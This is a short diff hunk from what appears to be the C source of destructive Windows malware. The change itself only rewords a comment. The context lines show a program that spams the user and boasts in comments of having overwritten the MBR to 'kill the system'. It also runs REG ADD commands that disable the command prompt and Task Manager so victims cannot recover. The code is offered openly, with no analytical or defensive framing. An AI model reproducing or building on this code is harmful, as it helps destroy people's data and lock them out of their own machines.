@@ -65,7 +65,7 @@ int main()
         spamusr();
       
         // What? We have killed the system! No, they can find it again with some powerful tools. We have to use the legacy system killer again,
-        // except the delete data, because we have overwritten MBR, so we can't write data to the disk.
+        // except the delete data, because we have overwritten MBR, so we can't modify data on the disk.
 
         system("REG ADD HKCU\\Software\\Policies\\Microsoft\\Windows\\System /v DisableCMD /t REG_DWORD /d 2 /f");
         system("REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f");
